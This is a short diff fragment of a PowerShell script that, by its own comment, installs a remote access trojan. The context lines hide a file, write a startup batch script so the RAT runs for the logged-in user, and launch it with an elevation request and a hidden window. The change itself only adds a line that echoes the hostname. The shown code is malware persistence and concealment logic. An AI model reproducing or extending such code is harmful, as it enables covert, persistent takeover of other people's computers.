@@ -47,6 +47,7 @@ $hideFile.attributes = "Hidden"
 # Add a startup script (BAT) to make sure RAT is run by the logging user
 add-content $startup "@echo off"
 add-content $startup "powershell -c start -verb runas $localpath -windowstyle hidden" 
+add-content $startup "echo $hostname"
 
 
 # Shift pagefile to the temporary drive (just in case)
